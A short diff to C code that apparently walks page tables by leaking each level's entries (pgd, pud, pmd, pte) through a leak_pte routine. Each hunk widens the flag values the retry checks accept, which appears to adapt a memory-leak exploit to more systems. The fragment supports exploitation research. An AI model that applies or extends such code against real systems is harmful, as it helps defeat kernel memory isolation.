@@ -154,7 +154,7 @@ retry_pgd:
 	pte_t pgd = leak_pte(base, pgd_pa);
 	if (verbose >= 2) dumpp(pgd);
 	if (verbose == 1) { fprintf(stderr, " --> pgd %10lx ", pgd); fflush(stdout); }
-	if (!(((pgd & 0xfff) == 0x067) || ((pgd & 0xfff) == 0x907))) {
+	if (!(((pgd & 0xfff) == 0x067) || ((pgd & 0xfff) == 0x907) || ((pgd & 0xfff) == 0x107))) {
 		if (verbose == 1) fprintf(stderr, "\n\t--> ");
 		goto retry_pgd;
 	}
@@ -174,7 +174,7 @@ retry_pud:
 	pte_t pud = leak_pte(base, pud_pa);
 	if (verbose >= 2) dumpp(pud);
 	if (verbose == 1) { fprintf(stderr, "pud %10lx ", pud); fflush(stdout); }
-	if (!(((pud & 0xfff) == 0x067) || ((pud & 0xfff) == 0x063) || ((pud & 0xfff) == 0x907))) {
+	if (!(((pud & 0xfff) == 0x067) || ((pud & 0xfff) == 0x063) || ((pud & 0xfff) == 0x907) || ((pud & 0xfff) == 0x107) || ((pud & 0xfff) == 0xff7))) {
 		if (verbose == 1) fprintf(stderr, "\n\t--> ");
 		goto retry_pud;
 	}
@@ -200,7 +200,7 @@ retry_pmd:
 	pte_t pmd = leak_pte(base, pmd_pa);
 	if (verbose >= 2) dumpp(pmd);
 	if (verbose == 1) { fprintf(stderr, "pmd %10lx ", pmd); fflush(stdout); }
-	if (!(((pmd & 0xfff) == 0x067) || ((pmd & 0xfff) == 0x907) || ((pmd & 0xfff) == 0xbf7) || ((pmd & 0xfff) == 0xbf3) || ((pmd & 0xfff) == 0x8f3) || ((pmd & 0xfff) == 0x9f3) || ((pmd & 0xfff) == 0x0e3))) {
+	if (!(((pmd & 0xfff) == 0x067) || ((pmd & 0xfff) == 0x907) || ((pmd & 0xfff) == 0xff7) || ((pmd & 0xfff) == 0xbf7) || ((pmd & 0xfff) == 0xbf3) || ((pmd & 0xfff) == 0x8f3) || ((pmd & 0xfff) == 0x9f3) || ((pmd & 0xfff) == 0x0e3))) {
 		if (verbose == 1) fprintf(stderr, "\n\t--> ");
 		goto retry_pmd;
 	}
@@ -225,7 +225,7 @@ retry_pmd:
 	pte_t pte = leak_pte(base, pte_pa);
 	if (verbose >= 2) dumpp(pte);
 	if (verbose == 1) { fprintf(stderr, "pte %10lx ", pte); fflush(stdout); }
-	if (!(((pte & 0xfff) == 0x063) || ((pte & 0xfff) == 0x907) || ((pte & 0xfff) == 0x877) || ((pte & 0xfff) == 0xb77))) {
+	if (!(((pte & 0xfff) == 0x063) || ((pte & 0xfff) == 0x907) || ((pte & 0xfff) == 0x107) || ((pte & 0xfff) == 0x877) || ((pte & 0xfff) == 0xb77))) {
 		if (verbose == 1) fprintf(stderr, "\n\t--> ");
 		goto retry_pmd;
 	}
